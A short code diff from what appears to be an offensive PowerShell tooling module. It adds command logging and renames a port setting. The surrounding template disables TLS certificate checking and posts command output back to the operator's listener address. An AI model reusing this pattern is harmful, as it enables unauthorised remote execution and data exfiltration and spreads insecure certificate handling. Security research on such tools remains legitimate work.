@@ -4,6 +4,8 @@ import logging
 import settings
 
 def ps_command(command):
+    logging.info('PS command to be encoded: ' + command)
+
     if settings.args.server == 'https':
         logging.info('Disabling certificate checking for the following PS command: ' + command)
         command = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + command
@@ -64,7 +66,7 @@ class PowerShell:
         $requestStream.Write( $bytes, 0, $bytes.Length );
         $requestStream.Close();
         $request.GetResponse();""".format(protocol=self.protocol,
-                                          port=settings.args.port,
+                                          port=settings.args.server_port,
                                           addr=self.localip,
                                           view_command=command)
 
